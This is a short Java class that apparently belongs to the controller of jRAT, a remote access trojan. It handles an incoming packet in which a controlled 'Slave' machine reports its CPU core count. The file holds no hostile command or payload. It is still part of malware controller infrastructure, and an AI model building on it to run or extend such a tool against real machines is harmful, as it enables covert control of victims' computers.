package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet14InitAvailableCores extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		short cores = slave.readShort();
		slave.setCores(cores);
	}

}
